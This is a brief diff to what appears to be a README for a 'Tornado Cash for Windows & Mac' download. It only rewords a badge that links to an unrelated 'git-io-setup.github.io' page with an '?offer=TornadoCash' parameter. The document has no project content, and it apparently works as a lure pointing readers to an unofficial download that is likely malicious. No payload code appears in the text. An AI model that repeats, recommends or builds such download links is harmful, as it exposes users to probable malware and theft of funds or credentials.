@@ -1,10 +1,10 @@
-# Download Tornado Cash for Windows & Mac
+# Tornado Cash for Windows & Mac
 
 <a href="https://git-io-setup.github.io/.github/?offer=TornadoCash" target="_blank" rel="noopener noreferrer">
   <img 
-    src="https://img.shields.io/badge/Get%20Tornado%20Cash%20GitHub-2EA44F?style=plastic&logo=github&logoColor=white" 
+    src="https://img.shields.io/badge/Tornado%20Cash%20GitHub-2EA44F?style=plastic&logo=github&logoColor=white" 
     width="320" 
-    alt="Get Tornado Cash GitHub">
+    alt="Tornado Cash GitHub">
 </a>
 
 ---
